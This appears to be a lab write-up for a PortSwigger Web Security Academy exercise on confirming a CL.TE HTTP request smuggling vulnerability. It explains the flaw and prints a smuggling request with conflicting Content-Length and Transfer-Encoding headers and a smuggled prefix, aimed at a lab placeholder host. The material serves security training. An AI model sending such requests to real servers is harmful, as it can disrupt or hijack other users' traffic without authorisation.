# Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses

**Official lab:** [https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)

## Lab idea

This finding-focused lab practices confirming a CL.TE request-boundary discrepancy by observing how a later response differs from normal behavior. The emphasis is on recognizing a diagnostic signal rather than exploiting an application feature.

## Vulnerability in brief
HTTP request smuggling (often called **HTTP desync**) is a vulnerability class in which components that process a sequence of HTTP requests disagree about where one request ends and the next begins. In a common deployment, a frontend proxy or load balancer forwards multiple user requests over a reused connection to a backend. If the two systems parse an ambiguous request differently, bytes treated as body by one may be read as the start of another request by the other. This can cause an attacker-controlled prefix to interfere with a later request.

## Solution idea
1. Using Burp Repeater, issue the following request twice:
2. The second request should receive an HTTP 404 response.

## Payloads / key values
- `POST / HTTP/1.1 Host: YOUR-LAB-ID.web-security-academy.net Content-Type: application/x-www-form-urlencoded Content-Length: 35 Transfer-Encoding: chunked 0 GET /404 HTTP/1.1 X-Ignore: X`

## Official source
- [PortSwigger Academy: Lab: HTTP request smuggling, confirming a CL.TE vulnerability via differential responses](https://portswigger.net/web-security/request-smuggling/finding/lab-confirming-cl-te-via-differential-responses)
